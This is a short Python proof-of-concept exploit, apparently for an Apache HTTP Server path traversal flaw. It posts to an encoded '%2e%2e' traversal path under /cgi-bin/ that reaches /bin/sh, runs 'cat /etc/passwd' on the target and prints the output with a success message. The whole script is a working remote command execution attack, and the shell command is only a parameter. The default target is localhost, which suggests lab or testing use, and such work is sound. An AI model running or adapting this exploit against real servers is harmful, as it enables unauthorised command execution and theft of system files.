
import urllib.request
import socket

def exploit(address):
  sh_code = "cat /etc/passwd"
  url = "http://"+address+"/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\n"
  payload = "echo; %s" % sh_code
  # print(payload)
  req = urllib.request.Request(url, data=payload.encode('utf-8'))

  try:
    res = urllib.request.urlopen(req)
    print(res.read().decode('utf-8'))
    if res.status == 200:
      print("exploit succeeded! access to %s" % address)
  except urllib.error.URLError:
    print('Server %s is not vulnerable' % address)
  except socket.timeout:
    print('Server %s does not response' % address)
  except ConnectionResetError:
    print('Server %s connection reset' % address)


if __name__ == "__main__":
  exploit("localhost:8080")